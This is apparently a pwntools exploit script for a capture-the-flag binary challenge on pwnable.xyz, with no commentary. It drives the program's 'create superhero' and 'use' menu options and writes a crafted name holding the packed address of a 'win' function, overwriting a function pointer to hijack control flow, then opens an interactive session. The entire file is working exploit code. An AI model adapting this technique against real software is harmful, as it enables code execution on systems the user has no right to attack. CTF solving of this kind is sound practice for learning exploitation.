from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30032)

sla = r.sendlineafter
sa = r.sendafter

def create(len, name, superpower):
    sla('> ', '1')
    sla('How long do you want your superhero\'s name to be? \n', str(len))
    sa('Great! Please enter your hero\'s name: ', name)
    sla('> ', str(superpower))

def use():
    sla('> ', '2')

win = 0x400a33

create(100, 'A' * 100, 1)
create(100, b'B' * 7 + p64(win), 0)
use()

r.interactive()